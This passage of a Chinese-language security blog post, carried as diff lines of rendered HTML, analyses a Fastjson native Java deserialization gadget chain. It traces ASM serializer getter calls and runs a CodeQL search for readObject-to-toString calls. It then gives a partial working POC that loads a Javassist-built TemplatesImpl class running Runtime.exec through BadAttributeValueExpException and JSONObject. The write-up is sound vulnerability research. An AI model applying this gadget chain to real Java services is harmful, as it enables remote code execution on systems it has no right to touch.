+	srcset="/p/fastjson%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20240409113247806_hu6bd9801184643fa33f739a7017853f6b_70742_480x0_resize_box_3.png 480w, /p/fastjson%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20240409113247806_hu6bd9801184643fa33f739a7017853f6b_70742_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240409113247806"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="351"
+		data-flex-basis="842px"
+	
+></p>
+<p>利用ASM动态生成 ASMSerializer_1_Person</p>
+<p><strong>ASMSerializerFactory#generateWriteMethod</strong></p>
+<p><img src="/p/fastjson%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20240409112720064.png"
+	width="1200"
+	height="424"
+	srcset="/p/fastjson%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20240409112720064_hu62439986269488a087f099cc19b36773_80139_480x0_resize_box_3.png 480w, /p/fastjson%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20240409112720064_hu62439986269488a087f099cc19b36773_80139_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240409112720064"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="283"
+		data-flex-basis="679px"
+	
+></p>
+<p>遍历 <code>getter</code> 方法，根据返回类型选择对应处理方法。自定义的 <code>getAge()</code> 返回类型为 <code>int</code>，故而进入 <code>_int()</code></p>
+<p><img src="/p/fastjson%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20240409113030012.png"
+	width="1192"
+	height="430"
+	srcset="/p/fastjson%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20240409113030012_hu6647a9fac332507a76271545c102a474_87079_480x0_resize_box_3.png 480w, /p/fastjson%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20240409113030012_hu6647a9fac332507a76271545c102a474_87079_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240409113030012"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="277"
+		data-flex-basis="665px"
+	
+></p>
+<p><strong>ASMSerializerFactory#_get()</strong></p>
+<p><img src="/p/fastjson%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20240409113059870.png"
+	width="1192"
+	height="281"
+	srcset="/p/fastjson%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20240409113059870_hu89fdce778087343731596086b187116a_73806_480x0_resize_box_3.png 480w, /p/fastjson%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20240409113059870_hu89fdce778087343731596086b187116a_73806_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240409113059870"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="424"
+		data-flex-basis="1018px"
+	
+></p>
+<p>此处利用 <code>visitMethodInsn</code> 方法调用对应的 <code>getter</code>，即 <code>getAge()</code></p>
+<p>偶然间翻到之前生成的 ASMSerializer_1_BasicDataSource，倒是可以作为一个不错的参考</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#c678dd">public</span> <span style="color:#e5c07b">void</span> <span style="color:#61afef;font-weight:bold">write</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">JSONSerializer</span> <span style="color:#e06c75">var1</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">Object</span> <span style="color:#e06c75">var2</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">Object</span> <span style="color:#e06c75">var3</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">Type</span> <span style="color:#e06c75">var4</span><span style="color:#56b6c2">,</span> <span style="color:#e5c07b">int</span> <span style="color:#e06c75">var5</span><span style="color:#56b6c2">)</span> <span style="color:#c678dd">throws</span> <span style="color:#e06c75">IOException</span> <span style="color:#56b6c2">{</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">SerializeWriter</span> <span style="color:#e06c75">var9</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">var1</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">out</span><span style="color:#56b6c2">;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">if</span> <span style="color:#56b6c2">(!</span><span style="color:#c678dd">this</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">writeDirect</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">var1</span><span style="color:#56b6c2">))</span> <span style="color:#56b6c2">{</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">this</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">writeNormal</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">var1</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">var2</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">var3</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">var4</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">var5</span><span style="color:#56b6c2">);</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#56b6c2">}</span> <span style="color:#c678dd">else</span> <span style="color:#c678dd">if</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">var9</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">isEnabled</span><span style="color:#56b6c2">(</span><span style="color:#d19a66">32768</span><span style="color:#56b6c2">))</span> <span style="color:#56b6c2">{</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">this</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">writeDirectNonContext</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">var1</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">var2</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">var3</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">var4</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">var5</span><span style="color:#56b6c2">);</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#56b6c2">}</span> <span style="color:#c678dd">else</span> <span style="color:#56b6c2">{</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">BasicDataSource</span> <span style="color:#e06c75">var10</span> <span style="color:#56b6c2">=</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">BasicDataSource</span><span style="color:#56b6c2">)</span><span style="color:#e06c75">var2</span><span style="color:#56b6c2">;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">if</span> <span style="color:#56b6c2">(!</span><span style="color:#c678dd">this</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">writeReference</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">var1</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">var2</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">var5</span><span style="color:#56b6c2">))</span> <span style="color:#56b6c2">{</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#c678dd">if</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">var9</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">isEnabled</span><span style="color:#56b6c2">(</span><span style="color:#d19a66">2097152</span><span style="color:#56b6c2">))</span> <span style="color:#56b6c2">{</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#c678dd">this</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">writeAsArray</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">var1</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">var2</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">var3</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">var4</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">var5</span><span style="color:#56b6c2">);</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#56b6c2">}</span> <span style="color:#c678dd">else</span> <span style="color:#56b6c2">{</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e06c75">SerialContext</span> <span style="color:#e06c75">var11</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">var1</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getContext</span><span style="color:#56b6c2">();</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e06c75">var1</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">setContext</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">var11</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">var2</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">var3</span><span style="color:#56b6c2">,</span> <span style="color:#d19a66">0</span><span style="color:#56b6c2">);</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e5c07b">byte</span> <span style="color:#e06c75">var12</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">123</span><span style="color:#56b6c2">;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e06c75">String</span> <span style="color:#e06c75">var6</span> <span style="color:#56b6c2">=</span> <span style="color:#98c379">&#34;abandonedLogWriter&#34;</span><span style="color:#56b6c2">;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e06c75">PrintWriter</span> <span style="color:#e06c75">var13</span><span style="color:#56b6c2">;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e06c75">ObjectSerializer</span> <span style="color:#e06c75">var14</span><span style="color:#56b6c2">;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#c678dd">if</span> <span style="color:#56b6c2">(!</span><span style="color:#e06c75">var9</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">isEnabled</span><span style="color:#56b6c2">(</span><span style="color:#d19a66">33554432</span><span style="color:#56b6c2">))</span> <span style="color:#56b6c2">{</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#e06c75">var13</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">var10</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getAbandonedLogWriter</span><span style="color:#56b6c2">();</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#7f848e">// 这里调用了 abandonedLogWriter 对应的 getter
+</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                    <span style="color:#c678dd">if</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">var13</span> <span style="color:#56b6c2">==</span> <span style="color:#e5c07b">null</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">{</span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#c678dd">if</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">var9</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">isEnabled</span><span style="color:#56b6c2">(</span><span style="color:#d19a66">964</span><span style="color:#56b6c2">))</span> <span style="color:#56b6c2">{</span>
+</span></span><span style="display:flex;"><span>                            <span style="color:#e06c75">var9</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">write</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">var12</span><span style="color:#56b6c2">);</span>
+</span></span><span style="display:flex;"><span>                            <span style="color:#e06c75">var9</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">writeFieldNameDirect</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">var6</span><span style="color:#56b6c2">);</span>
+</span></span><span style="display:flex;"><span>                            <span style="color:#e06c75">var9</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">writeNull</span><span style="color:#56b6c2">(</span><span style="color:#d19a66">0</span><span style="color:#56b6c2">,</span> <span style="color:#d19a66">0</span><span style="color:#56b6c2">);</span>
+</span></span><span style="display:flex;"><span>                            <span style="color:#e06c75">var12</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">44</span><span style="color:#56b6c2">;</span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#56b6c2">}</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#56b6c2">}</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#56b6c2">...</span>
+</span></span></code></pre></div><hr>
+<p>既然 <code>JSONObject#toString</code> 能够触发 <code>getter</code>，那一切就好办了，<code>getter</code> 可以选择 <code>TemplatesImpl#getOutputProperties()</code>进行恶意类加载</p>
+<p>接下来只需要找到一个能触发 <code>toString</code> 的 <code>readObject</code> 方法</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span> <span style="color:#e06c75">import</span> <span style="color:#e06c75">java</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> <span style="color:#c678dd">from</span> <span style="color:#c678dd">Call</span> <span style="color:#c678dd">c</span>
+</span></span><span style="display:flex;"><span> <span style="color:#c678dd">where</span> <span style="color:#c678dd">c</span>.<span style="color:#e06c75">getCallee</span>().<span style="color:#e06c75">hasName</span>(<span style="color:#98c379">&#34;toString&#34;</span>) <span style="color:#c678dd">and</span> <span style="color:#c678dd">c</span>.<span style="color:#e06c75">getCaller</span>().<span style="color:#e06c75">hasName</span>(<span style="color:#98c379">&#34;readObject&#34;</span>)
+</span></span><span style="display:flex;"><span> <span style="color:#c678dd">select</span> <span style="color:#c678dd">c</span>.<span style="color:#e06c75">getCaller</span>(), <span style="color:#c678dd">c</span>.<span style="color:#e06c75">getCaller</span>().<span style="color:#e06c75">getDeclaringType</span>().<span style="color:#e06c75">getQualifiedName</span>()
+</span></span></code></pre></div><p>查询结果如下</p>
+<p><img src="/p/fastjson%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20240409183040203.png"
+	width="896"
+	height="378"
+	srcset="/p/fastjson%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20240409183040203_hu15ef97ef19c95e26c82da3e79d0342fa_41774_480x0_resize_box_3.png 480w, /p/fastjson%E5%8E%9F%E7%94%9F%E9%93%BE/img/image-20240409183040203_hu15ef97ef19c95e26c82da3e79d0342fa_41774_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240409183040203"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="237"
+		data-flex-basis="568px"
+	
+></p>
+<p><strong>BadAttributeValueExpException#readObject</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#c678dd">private</span> <span style="color:#e5c07b">void</span> <span style="color:#61afef;font-weight:bold">readObject</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">ObjectInputStream</span> <span style="color:#e06c75">ois</span><span style="color:#56b6c2">)</span> <span style="color:#c678dd">throws</span> <span style="color:#e06c75">IOException</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">ClassNotFoundException</span> <span style="color:#56b6c2">{</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">ObjectInputStream</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">GetField</span> <span style="color:#e06c75">gf</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">ois</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">readFields</span><span style="color:#56b6c2">();</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">Object</span> <span style="color:#e06c75">valObj</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">gf</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">get</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;val&#34;</span><span style="color:#56b6c2">,</span> <span style="color:#e5c07b">null</span><span style="color:#56b6c2">);</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">if</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">valObj</span> <span style="color:#56b6c2">==</span> <span style="color:#e5c07b">null</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">{</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">val</span> <span style="color:#56b6c2">=</span> <span style="color:#e5c07b">null</span><span style="color:#56b6c2">;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#56b6c2">}</span> <span style="color:#c678dd">else</span> <span style="color:#c678dd">if</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">valObj</span> <span style="color:#c678dd">instanceof</span> <span style="color:#e06c75">String</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">{</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">val</span><span style="color:#56b6c2">=</span> <span style="color:#e06c75">valObj</span><span style="color:#56b6c2">;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#56b6c2">}</span> <span style="color:#c678dd">else</span> <span style="color:#c678dd">if</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">System</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getSecurityManager</span><span style="color:#56b6c2">()</span> <span style="color:#56b6c2">==</span> <span style="color:#e5c07b">null</span>
+</span></span><span style="display:flex;"><span>               <span style="color:#56b6c2">||</span> <span style="color:#e06c75">valObj</span> <span style="color:#c678dd">instanceof</span> <span style="color:#e06c75">Long</span>
+</span></span><span style="display:flex;"><span>               <span style="color:#56b6c2">||</span> <span style="color:#e06c75">valObj</span> <span style="color:#c678dd">instanceof</span> <span style="color:#e06c75">Integer</span>
+</span></span><span style="display:flex;"><span>               <span style="color:#56b6c2">||</span> <span style="color:#e06c75">valObj</span> <span style="color:#c678dd">instanceof</span> <span style="color:#e06c75">Float</span>
+</span></span><span style="display:flex;"><span>               <span style="color:#56b6c2">||</span> <span style="color:#e06c75">valObj</span> <span style="color:#c678dd">instanceof</span> <span style="color:#e06c75">Double</span>
+</span></span><span style="display:flex;"><span>               <span style="color:#56b6c2">||</span> <span style="color:#e06c75">valObj</span> <span style="color:#c678dd">instanceof</span> <span style="color:#e06c75">Byte</span>
+</span></span><span style="display:flex;"><span>               <span style="color:#56b6c2">||</span> <span style="color:#e06c75">valObj</span> <span style="color:#c678dd">instanceof</span> <span style="color:#e06c75">Short</span>
+</span></span><span style="display:flex;"><span>               <span style="color:#56b6c2">||</span> <span style="color:#e06c75">valObj</span> <span style="color:#c678dd">instanceof</span> <span style="color:#e06c75">Boolean</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">{</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">val</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">valObj</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">toString</span><span style="color:#56b6c2">();</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#56b6c2">}</span> <span style="color:#c678dd">else</span> <span style="color:#56b6c2">{</span> <span style="color:#7f848e">// the serialized object is from a version without JDK-8019292 fix
+</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>        <span style="color:#e06c75">val</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">System</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">identityHashCode</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">valObj</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">+</span> <span style="color:#98c379">&#34;@&#34;</span> <span style="color:#56b6c2">+</span> <span style="color:#e06c75">valObj</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getClass</span><span style="color:#56b6c2">().</span><span style="color:#e06c75">getName</span><span style="color:#56b6c2">();</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#56b6c2">}</span>
+</span></span><span style="display:flex;"><span><span style="color:#56b6c2">}</span>
+</span></span></code></pre></div><p>因此整条链子就是</p>
+<pre tabindex="0"><code>BadAttributeValueExpException#readObject() -&gt; JSONObject#toString() -&gt; TemplatesImpl#getOutputProperties()
+</code></pre><p>形成POC</p>
+<h4 id="poc">POC</h4>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#c678dd">import</span> <span style="color:#e06c75">com.alibaba.fastjson.JSONObject</span><span style="color:#56b6c2">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#c678dd">import</span> <span style="color:#e06c75">com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</span><span style="color:#56b6c2">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#c678dd">import</span> <span style="color:#e06c75">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><span style="color:#56b6c2">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#c678dd">import</span> <span style="color:#e06c75">javassist.*</span><span style="color:#56b6c2">;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#c678dd">import</span> <span style="color:#e06c75">javax.management.BadAttributeValueExpException</span><span style="color:#56b6c2">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#c678dd">import</span> <span style="color:#e06c75">java.io.*</span><span style="color:#56b6c2">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#c678dd">import</span> <span style="color:#e06c75">java.lang.reflect.Field</span><span style="color:#56b6c2">;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#c678dd">public</span> <span style="color:#c678dd">class</span> <span style="color:#e5c07b">FastjsonUnserialize</span> <span style="color:#56b6c2">{</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">public</span> <span style="color:#c678dd">static</span> <span style="color:#e5c07b">void</span> <span style="color:#61afef;font-weight:bold">main</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">String</span><span style="color:#56b6c2">[]</span> <span style="color:#e06c75">args</span><span style="color:#56b6c2">)</span> <span style="color:#c678dd">throws</span> <span style="color:#e06c75">CannotCompileException</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">NotFoundException</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">IOException</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">InstantiationException</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">IllegalAccessException</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">NoSuchFieldException</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">ClassNotFoundException</span> <span style="color:#56b6c2">{</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">String</span> <span style="color:#e06c75">codes</span> <span style="color:#56b6c2">=</span> <span style="color:#98c379">&#34;java.lang.Runtime.getRuntime().exec(\&#34;calc\&#34;);&#34;</span><span style="color:#56b6c2">;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">ClassPool</span> <span style="color:#e06c75">pool</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">ClassPool</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getDefault</span><span style="color:#56b6c2">();</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">CtClass</span> <span style="color:#e06c75">cc</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">pool</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">makeClass</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;hhh&#34;</span><span style="color:#56b6c2">);</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">cc</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">makeClassInitializer</span><span style="color:#56b6c2">().</span><span style="color:#e06c75">insertBefore</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">codes</span><span style="color:#56b6c2">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">cc</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">setSuperclass</span><span style="color:#56b6c2">((</span><span style="color:#e06c75">pool</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">get</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">AbstractTranslet</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">class</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getName</span><span style="color:#56b6c2">())));</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e5c07b">byte</span><span style="color:#56b6c2">[]</span> <span style="color:#e06c75">bytecodes</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">cc</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">toBytecode</span><span style="color:#56b6c2">();</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">TemplatesImpl</span> <span style="color:#e06c75">templates</span> <span style="color:#56b6c2">=</span> <span style="color:#c678dd">new</span> <span style="color:#e06c75">TemplatesImpl</span><span style="color:#56b6c2">();</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">Class</span> <span style="color:#e06c75">tc</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">templates</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getClass</span><span style="color:#56b6c2">();</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">Field</span> <span style="color:#e06c75">nameField</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">tc</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getDeclaredField</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;_name&#34;</span><span style="color:#56b6c2">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">nameField</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">setAccessible</span><span style="color:#56b6c2">(</span><span style="color:#e5c07b">true</span><span style="color:#56b6c2">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">nameField</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">set</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">templates</span><span style="color:#56b6c2">,</span><span style="color:#98c379">&#34;a&#34;</span><span style="color:#56b6c2">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">Field</span> <span style="color:#e06c75">bytecodesField</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">tc</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getDeclaredField</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;_bytecodes&#34;</span><span style="color:#56b6c2">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">bytecodesField</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">setAccessible</span><span style="color:#56b6c2">(</span><span style="color:#e5c07b">true</span><span style="color:#56b6c2">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e5c07b">byte</span><span style="color:#56b6c2">[][]</span> <span style="color:#e06c75">bytes</span> <span style="color:#56b6c2">=</span> <span style="color:#c678dd">new</span> <span style="color:#e5c07b">byte</span><span style="color:#56b6c2">[][]{</span><span style="color:#e06c75">bytecodes</span><span style="color:#56b6c2">};</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">bytecodesField</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">set</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">templates</span><span style="color:#56b6c2">,</span><span style="color:#e06c75">bytes</span><span style="color:#56b6c2">);</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">JSONObject</span> <span style="color:#e06c75">jsonObject</span> <span style="color:#56b6c2">=</span> <span style="color:#c678dd">new</span> <span style="color:#e06c75">JSONObject</span><span style="color:#56b6c2">();</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">jsonObject</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">put</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;aaa&#34;</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">templates</span><span style="color:#56b6c2">);</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">Class</span><span style="color:#56b6c2">&lt;?&gt;</span> <span style="color:#e06c75">badClass</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">Class</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">forName</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;javax.management.BadAttributeValueExpException&#34;</span><span style="color:#56b6c2">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">BadAttributeValueExpException</span> <span style="color:#e06c75">bad</span> <span style="color:#56b6c2">=</span> <span style="color:#c678dd">new</span> <span style="color:#e06c75">BadAttributeValueExpException</span><span style="color:#56b6c2">(</span><span style="color:#e5c07b">null</span><span style="color:#56b6c2">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">Field</span> <span style="color:#e06c75">valField</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">badClass</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getDeclaredField</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;val&#34;</span><span style="color:#56b6c2">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">valField</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">setAccessible</span><span style="color:#56b6c2">(</span><span style="color:#e5c07b">true</span><span style="color:#56b6c2">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">valField</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">set</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">bad</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">jsonObject</span><span style="color:#56b6c2">);</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">ByteArrayOutputStream</span> <span style="color:#e06c75">byteArrayOutputStream</span> <span style="color:#56b6c2">=</span> <span style="color:#c678dd">new</span> <span style="color:#e06c75">ByteArrayOutputStream</span><span style="color:#56b6c2">();</span>
